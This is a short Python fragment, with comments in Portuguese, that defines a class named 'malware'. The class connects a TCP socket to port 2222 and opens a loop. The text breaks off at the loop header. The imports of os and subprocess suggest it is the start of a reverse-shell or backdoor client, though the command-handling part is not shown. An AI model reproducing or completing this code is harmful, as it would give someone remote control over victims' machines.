#!/bin/python
#MODULOS IMPORTADOS:
import os
import subprocess as s
import socket
#Funcoes De Escolha:
class malware:
  def __init__(self):
    self.loop = True
    self.port = 2222
    self.host = '0.0.0.0'
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  def run(self):
    self.socket.connect((self.host,self.port))
    while self.loop == True: